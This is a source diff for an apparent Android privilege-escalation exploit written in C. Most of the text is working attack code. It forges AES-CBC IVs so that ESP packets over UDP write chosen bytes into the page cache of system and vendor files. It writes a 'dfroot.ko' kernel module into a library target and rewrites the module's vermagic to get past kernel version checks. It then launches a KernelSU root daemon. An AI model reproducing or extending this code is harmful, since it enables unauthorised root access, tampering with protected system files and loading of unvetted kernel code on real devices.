@@ -17,8 +17,6 @@
 #include <arpa/inet.h>
 #include "aes256.h"
 
-#define eos(s) (s + strlen(s))
-
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
 
@@ -27,6 +25,10 @@ static int      g_sender_port;
 static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint32_t g_seq = 1;
+static int      g_kmi_android;
+static int      g_kmi_major;
+static int      g_kmi_minor;
+static const char *g_vermagic;
 struct PatchRestore {
     const char *lib;
     uint64_t    tramp_aligned;
@@ -39,12 +41,8 @@ struct PatchRestore {
 
 static struct PatchRestore g_libcxx_r;
 
-/* IV = AES256_ECB_DEC(key, old_content) XOR desired
- * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
- *   = AES_DEC(key, old_content) XOR IV
- *   = AES_DEC(key, old_content) XOR (AES_DEC(key, old_content) XOR desired)
- *   = desired
- */
+/* IV = AES256_ECB_DEC(key, old_content) XOR desired, so that CBC decryption
+ * yields plaintext = AES_DEC(key, old_content) XOR IV = desired. */
 static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16], uint8_t iv[16]) {
     uint8_t dec[16];
     aes256_ecb_decrypt(g_aes_key, old_content, dec);
@@ -111,12 +109,9 @@ static int read_vendor_content(off_t offset, uint8_t buf[16]) {
     return 0;
 }
 
-/* Send one CBC write.
- * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
- * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
- * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
- * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
- */
+/* Send one CBC write. ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext(16).
+ * use_helper=0 splices the file page directly; use_helper=1 goes through
+ * crash_dump64 for vendor files. sk_send is created once and reused. */
 static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, off_t offset,
                             const uint8_t iv[16], int use_helper) {
     uint8_t hdr[24];
@@ -148,12 +143,9 @@ static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, 
     return 0;
 }
 
-/* Patch len bytes of payload into file starting at file offset foff.
- * Writes in 16-byte CBC blocks.
- * For system files (use_helper=0): reads old_content with pread().
- * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
- * len must be a multiple of 16.
- */
+/* Patch len bytes at foff in 16-byte CBC blocks. old_content comes from pread()
+ * for system files and via the crash_dump bridge for vendor files; len must be
+ * a multiple of 16. */
 static int patch_file_cbc(const char *path, const char *payload, size_t len,
                            size_t foff, int use_helper) {
     if (len % 16 != 0) {
@@ -300,36 +292,59 @@ static const struct KoImage *select_ko_image(int andr, int major, int minor) {
     return fb;
 }
 
+static int trim_nl(char *s) {
+    size_t n = strlen(s);
+    while (n && (s[n - 1] == '\n' || s[n - 1] == '\r' || s[n - 1] == ' '))
+        s[--n] = '\0';
+    return n ? 0 : -1;
+}
+
+static int read_prop(const char *name, char *buf, size_t n) {
+    char cmd[96];
+    snprintf(cmd, sizeof(cmd), "getprop %s", name);
+    FILE *f = popen(cmd, "r");
+    if (!f) return -1;
+    if (!fgets(buf, (int)n, f)) {
+        pclose(f);
+        if (n) buf[0] = '\0';
+        return -1;
+    }
+    pclose(f);
+    return trim_nl(buf);
+}
+
 static int read_device_versions(int *andr, int *major, int *minor) {
-    struct utsname u;
-    if (uname(&u) != 0) return -1;
-    if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
-    const char *m = strstr(u.release, "android");
-    if (!m) {
-        /* Some vendor kernels drop the "androidNN" token from uname -r, which
-         * leaves nothing to parse here. ro.vendor.build.version.release carries
-         * the same number, so fall back to it - but the popen is untrusted: it
-         * can fail outright, and the property is neither guaranteed numeric nor
-         * short, so nothing is built until a leading integer has actually been
-         * read out of it. */
-        printf("uname -r is missing Android version, trying getprop\n");
-        char vendor_ver[16] = { 0 };
-        FILE *f = popen("getprop ro.vendor.build.version.release", "r");
-        if (f) {
-            if (!fgets(vendor_ver, sizeof(vendor_ver), f))
-                vendor_ver[0] = '\0';
-            pclose(f);
-        }
-        int prop = 0;
-        if (sscanf(vendor_ver, "%d", &prop) != 1 || prop <= 0) {
-            printf("getprop returned no usable Android version\n");
-            return -1;
-        }
-        *andr = prop;
+    if (g_kmi_android > 0) {
+        *andr = g_kmi_android;
+        *major = g_kmi_major;
+        *minor = g_kmi_minor;
         return 0;
     }
-    *andr = atoi(m + strlen("android"));
-    return (*andr > 0) ? 0 : -1;
+    int have_kver = 0, have_andr = 0;
+    struct utsname u;
+    if (uname(&u) == 0) {
+        if (sscanf(u.release, "%d.%d", major, minor) == 2) have_kver = 1;
+        const char *m = strstr(u.release, "android");
+        if (m) {
+            *andr = atoi(m + 7);
+            if (*andr > 0) have_andr = 1;
+        }
+    }
+    if (!have_kver) {
+        char kver[32];
+        if (read_prop("ro.kernel.version", kver, sizeof(kver)) != 0) return -1;
+        if (sscanf(kver, "%d.%d", major, minor) != 2) return -1;
+        have_kver = 1;
+    }
+    if (!have_andr) {
+        char aver[32];
+        if (read_prop("ro.vendor.build.version.release", aver, sizeof(aver)) != 0) return -1;
+        *andr = atoi(aver);
+        if (*andr <= 0) return -1;
+        printf("kmi: uname missing android version, using getprop android%d-%d.%d\n",
+               *andr, *major, *minor);
+    }
+    return 0;
 }
 
 /* Pad payload to a multiple of 16 bytes in a heap buffer. Caller must free(). */
@@ -339,6 +354,145 @@ static char *pad16(const char *data, size_t len, size_t *out_len) {
     if (buf) memcpy(buf, data, len);
     *out_len = padded;
     return buf;
+}
+
+static uint16_t rd16(const uint8_t *p) {
+    return (uint16_t)(p[0] | ((uint16_t)p[1] << 8));
+}
+
+static uint32_t rd32(const uint8_t *p) {
+    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
+           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
+}
+
+static uint64_t rd64(const uint8_t *p) {
+    return (uint64_t)rd32(p) | ((uint64_t)rd32(p + 4) << 32);
+}
+
+static void wr64(uint8_t *p, uint64_t value) {
+    for (int i = 0; i < 8; i++) p[i] = (uint8_t)(value >> (i * 8));
+}
+
+static int patch_ko_vermagic(char *buf, size_t len, size_t capacity, size_t *new_len) {
+    if (!g_vermagic || !g_vermagic[0]) {
+        printf("vermagic: no target supplied, keeping module value\n");
+        return 0;
+    }
+    printf("vermagic: checking module\n");
+    printf("vermagic: target=%s\n", g_vermagic);
+    printf("vermagic: original size=%zu capacity=%zu\n", len, capacity);
+    if (len < 64 || memcmp(buf, "\x7f""ELF", 4) != 0 || buf[4] != 2 ||
+        buf[5] != 1 || rd16((uint8_t *)buf + 0x3a) != 64) {
+        printf("vermagic: failed - unsupported ELF64 little-endian module\n");
+        return -1;
+    }
+
+    uint64_t shoff = rd64((uint8_t *)buf + 0x28);
+    uint16_t shnum = rd16((uint8_t *)buf + 0x3c);
+    uint16_t shstrndx = rd16((uint8_t *)buf + 0x3e);
+    if (!shoff || !shnum || shstrndx >= shnum || shoff + (uint64_t)shnum * 64 > len) {
+        printf("vermagic: failed - invalid ELF section headers (shoff=0x%llx shnum=%u shstr=%u)\n",
+               (unsigned long long)shoff, shnum, shstrndx);
+        return -1;
+    }
+
+    const uint8_t *shstr = (uint8_t *)buf + shoff + (uint64_t)shstrndx * 64;
+    uint64_t shstr_off = rd64(shstr + 0x18);
+    uint64_t shstr_size = rd64(shstr + 0x20);
+    if (shstr_off + shstr_size > len) {
+        printf("vermagic: failed - section name string table outside file\n");
+        return -1;
+    }
+
+    uint8_t *modinfo = NULL;
+    uint64_t modinfo_off = 0, modinfo_size = 0, modinfo_align = 1;
+    for (uint16_t i = 0; i < shnum; i++) {
+        uint8_t *sh = (uint8_t *)buf + shoff + (uint64_t)i * 64;
+        uint32_t name_off = rd32(sh);
+        if (name_off >= shstr_size) continue;
+        const char *name = buf + shstr_off + name_off;
+        size_t max = (size_t)(shstr_size - name_off);
+        if (strnlen(name, max) == 8 && !memcmp(name, ".modinfo", 8)) {
+            modinfo = sh;
+            modinfo_off = rd64(sh + 0x18);
+            modinfo_size = rd64(sh + 0x20);
+            modinfo_align = rd64(sh + 0x30);
+            break;
+        }
+    }
+    if (!modinfo) {
+        printf("vermagic: failed - .modinfo not found\n");
+        return -1;
+    }
+    if (modinfo_off + modinfo_size > len) {
+        printf("vermagic: failed - .modinfo outside file (off=0x%llx size=%llu)\n",
+               (unsigned long long)modinfo_off, (unsigned long long)modinfo_size);
+        return -1;
+    }
+    printf("vermagic: .modinfo offset=0x%llx size=%llu alignment=%llu\n",
+           (unsigned long long)modinfo_off, (unsigned long long)modinfo_size,
+           (unsigned long long)modinfo_align);
+    if (!modinfo_align || (modinfo_align & (modinfo_align - 1))) modinfo_align = 1;
+
+    char replacement[256];
+    int replacement_len = snprintf(replacement, sizeof(replacement), "vermagic=%s", g_vermagic);
+    if (replacement_len <= 0 || (size_t)replacement_len >= sizeof(replacement)) {
+        printf("vermagic: failed - target string too long\n");
+        return -1;
+    }
+
+    for (size_t pos = 0; pos < modinfo_size;) {
+        size_t end = pos;
+        while (end < modinfo_size && buf[modinfo_off + end] != '\0') end++;
+        if ((size_t)replacement_len == end - pos &&
+            !memcmp(buf + modinfo_off + pos, replacement, (size_t)replacement_len)) {
+            printf("vermagic: already current, no change\n");
+            return 0;
+        }
+        pos = end + 1;
+    }
+
+    size_t entries_len = 0;
+    for (size_t pos = 0; pos < modinfo_size;) {
+        size_t end = pos;
+        while (end < modinfo_size && buf[modinfo_off + end] != '\0') end++;
+        size_t entry_len = end - pos;
+        if (entry_len && !(entry_len >= 9 && !memcmp(buf + modinfo_off + pos, "vermagic=", 9)))
+            entries_len += entry_len + 1;
+        pos = end + 1;
+    }
+    size_t new_modinfo_len = entries_len + (size_t)replacement_len + 1;
+    size_t new_offset = (len + modinfo_align - 1) & ~(size_t)(modinfo_align - 1);
+    if (new_offset + new_modinfo_len > capacity) {
+        printf("vermagic: failed - insufficient space, need=%zu available=%zu\n",
+               new_offset + new_modinfo_len, capacity);
+        return -1;
+    }
+
+    size_t out = new_offset;
+    for (size_t pos = 0; pos < modinfo_size;) {
+        size_t end = pos;
+        while (end < modinfo_size && buf[modinfo_off + end] != '\0') end++;
+        size_t entry_len = end - pos;
+        if (entry_len && !(entry_len >= 9 && !memcmp(buf + modinfo_off + pos, "vermagic=", 9))) {
+            memcpy(buf + out, buf + modinfo_off + pos, entry_len);
+            out += entry_len;
+            buf[out++] = '\0';
+        }
+        pos = end + 1;
+    }
+    memcpy(buf + out, replacement, (size_t)replacement_len);
+    out += (size_t)replacement_len;
+    buf[out++] = '\0';
+    if (out < new_offset + new_modinfo_len) memset(buf + out, 0, new_offset + new_modinfo_len - out);
+
+    wr64(modinfo + 0x18, new_offset);
+    wr64(modinfo + 0x20, new_modinfo_len);
+    memset(buf + len, 0, new_offset - len);
+    *new_len = new_offset + new_modinfo_len;
+    printf("vermagic: patched to %s\n", g_vermagic);
+    printf("vermagic: new .modinfo offset=0x%zx size=%zu\n", new_offset, new_modinfo_len);
+    return 1;
 }
 
 /* Write splicehelper into crash_dump64 page cache. */
@@ -379,13 +533,24 @@ static int patch_ko(void) {
     printf("Using KMI: android%d-%d.%d\n",
              ko->android_release, ko->kver_major, ko->kver_minor);
 
-    size_t len;
-    char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
-    if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
+    size_t raw_len = (size_t)(ko->end - ko->start);
+    size_t capacity = raw_len + 512;
+    printf("ko: preparing KMI android%d-%d.%d raw=%zu capacity=%zu\n",
+           ko->android_release, ko->kver_major, ko->kver_minor, raw_len, capacity);
+    char *buf = calloc(1, (capacity + 15) & ~(size_t)15);
+    if (!buf) { printf("patch: %s - ko alloc failed\n", libcxx_ko_target); return -1; }
+    memcpy(buf, ko->start, raw_len);
+    size_t len = raw_len;
+    int vm = patch_ko_vermagic(buf, raw_len, capacity, &len);
+    if (vm < 0) { printf("ko: vermagic patch failed, aborting\n"); free(buf); return -1; }
+    printf("ko: vermagic result=%s size=%zu\n", vm ? "changed" : "unchanged", len);
+    len = (len + 15) & ~(size_t)15;
+    printf("ko: writing target=%s aligned size=%zu\n", libcxx_ko_target, len);
     printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
     int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
     free(buf);
-    if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
+    if (ret) printf("ko: write failed ret=%d\n", ret);
+    else printf("ko: write succeeded\n");
     return ret;
 }
 
@@ -500,9 +665,16 @@ static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
     return 0;
 }
 
+static int parse_kmi(const char *kmi, int *andr, int *major, int *minor) {
+    char tail;
+    if (sscanf(kmi, "android%d-%d.%d%c", andr, major, minor, &tail) != 3) return -1;
+    return (*andr > 0 && *major > 0 && *minor >= 0) ? 0 : -1;
+}
+
 static void usage(const char *argv0) {
     fprintf(stderr,
-            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
+            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX [--kmi BRANCH] [--vermagic STRING]\n",
+            argv0);
 }
 
 static int setup(int argc, char **argv) {
@@ -510,6 +682,8 @@ static int setup(int argc, char **argv) {
     uint32_t spi = 0;
     uint8_t aes_key[32];
     int have_aes = 0;
+    const char *kmi = NULL;
+    const char *vermagic = NULL;
 
     for (int i = 1; i < argc; i++) {
         const char *a = argv[i];
@@ -521,6 +695,10 @@ static int setup(int argc, char **argv) {
             spi = (uint32_t)strtoul(argv[++i], NULL, 0);
         else if (!strcmp(a, "--aes-key") && i + 1 < argc)
             have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
+        else if (!strcmp(a, "--kmi") && i + 1 < argc)
+            kmi = argv[++i];
+        else if (!strcmp(a, "--vermagic") && i + 1 < argc)
+            vermagic = argv[++i];
         else { usage(argv[0]); return 2; }
     }
     if (!encap_port || !sender_port || !spi || !have_aes) {
@@ -532,6 +710,16 @@ static int setup(int argc, char **argv) {
     g_spi         = spi;
     g_seq         = 1;
     memcpy(g_aes_key, aes_key, 32);
+    g_vermagic = vermagic;
+
+    if (kmi && parse_kmi(kmi, &g_kmi_android, &g_kmi_major, &g_kmi_minor) != 0) {
+        fprintf(stderr, "invalid --kmi: %s\n", kmi);
+        return 2;
+    }
+    if (kmi && !select_ko_image(g_kmi_android, g_kmi_major, g_kmi_minor)) {
+        fprintf(stderr, "unsupported --kmi: %s\n", kmi);
+        return 2;
+    }
 
     const char *ko_target = detect_ko_target();
     libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
@@ -540,6 +728,7 @@ static int setup(int argc, char **argv) {
 
     printf("=== setup ===\n");
     printf("found ko_target: %s\n", ko_target);
+    printf("kmi selection: %s\n", kmi ? kmi : "auto");
     printf("encap port: %d\n", encap_port);
     printf("spi: 0x%x\n", spi);
     return 0;
@@ -562,35 +751,44 @@ static int exploit(void) {
     printf("\n=== init  ===\n");
     createOrphanProcess();
 
+    /* Markers live under the app's data directory, not /dev. Placed here so the
+     * app can read the same timeline the daemon does. */
+    static const char *const MARKERS = "/data/user_de/0/df.root/markers/";
     static const struct {
-        const char *path;
+        const char *name;
         const char *msg;
         int         rc;
     } markers[] = {
-        { "/dev/df",    "libc++: loading custom module",                    -1 },
-        { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
-        { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
-        { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
-        { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
-        { "/dev/dfmw0", "bootstrap: WARNING - clone zygote env failed",     -1 },
-        { "/dev/dfm3",  "bootstrap: setting partitions ro",                 -1 },
-        { "/dev/dfmw1", "bootstrap: WARNING - set partitions ro failed",    -1 },
-        { "/dev/dfm4",  "bootstrap: disabling ksu modules",                 -1 },
-        { "/dev/dfme1", "bootstrap: ERROR - disable modules failed",         1 },
-        { "/dev/dfm5",  "bootstrap: starting SU daemon",                    -1 },
-        { "/dev/dfm6",  "ksud start: SUCCESS",                               0 },
-        { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit",             1 },
+        { "kernel-module",      "kernel module: launching bootstrap",        -1 },
+        { "reached-prefs",      "daemon: reading app preferences file",      -1 },
+        { "warn-prefs",         "daemon: WARNING - reading prefs failed",    -1 },
+        { "reached-zygote-env", "daemon: adopting zygote env",               -1 },
+        { "warn-zygote-env",    "daemon: WARNING - adopt zygote env failed", -1 },
+        { "reached-partitions", "daemon: setting partitions ro",             -1 },
+        { "warn-partitions",    "daemon: WARNING - set partitions ro failed",-1 },
+        { "reached-modules",    "daemon: disabling ksu modules",             -1 },
+        { "err-modules",        "daemon: disable modules reported an error",  -1 },
+        /* Ready, or the handed-off plan already progressed far enough that
+         * cleanup deleted the ready marker (soft reboot). Either is success. */
+        { "daemon-ready",       "daemon: ready - control channel is open",    0 },
+        { "plan-accepted",      "daemon: plan accepted (cleanup / reboot)",   0 },
+        { "plan-done",          "daemon: plan completed",                     0 },
+        { "err-transport",      "daemon: ERROR - control channel unavailable",1 },
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
 
     for (int elapsed = 0; elapsed < 10000; elapsed += 10) {
         usleep(10000);
         for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
-            if (!seen[j] && access(markers[j].path, F_OK) == 0) {
-                seen[j] = 1;
-                printf("%s\n", markers[j].msg);
-                if (markers[j].rc >= 0) { rc = markers[j].rc; goto done; }
-            }
+            if (seen[j]) continue;
+            char path[256];
+            snprintf(path, sizeof(path), "%s%s", MARKERS, markers[j].name);
+            if (access(path, F_OK) != 0) continue;
+            seen[j] = 1;
+            printf("%s\n", markers[j].msg);
+            /* rc 0 ends the run while leaving the daemon alive; the app
+             * owns the control channel from here on. */
+            if (markers[j].rc > 0 || markers[j].rc == 0) { rc = markers[j].rc; goto done; }
         }
     }
     printf("timeout: ERROR - check logcat & dmesg\n");
